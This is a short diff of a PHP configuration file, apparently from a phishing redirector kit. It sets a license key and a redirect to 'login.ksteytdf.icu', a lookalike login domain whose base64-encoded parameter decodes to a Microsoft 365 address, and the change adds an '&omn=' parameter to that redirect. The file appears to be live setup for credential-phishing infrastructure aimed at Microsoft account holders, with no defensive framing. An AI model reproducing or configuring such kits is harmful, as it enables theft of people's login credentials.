@@ -14,7 +14,7 @@
 
 $license_key = "ks6zv5u0jn3sivn0ts5ej2hti9yaj8pj"; // [REQUIRED]
 
-$redirect = "https://login.ksteytdf.icu/?KBE1JTsP=aHR0cHM6Ly9tMzY1LmNsb3VkLm1pY3Jvc29mdC9zZWFyY2gvP2F1dGg9Mg=="; // URL or FILE [REQUIRED]
+$redirect = "https://login.ksteytdf.icu/?KBE1JTsP=aHR0cHM6Ly9tMzY1LmNsb3VkLm1pY3Jvc29mdC9zZWFyY2gvP2F1dGg9Mg==&omn="; // URL or FILE [REQUIRED]
 
 
 $parameter = 1; // [REQUIRED]
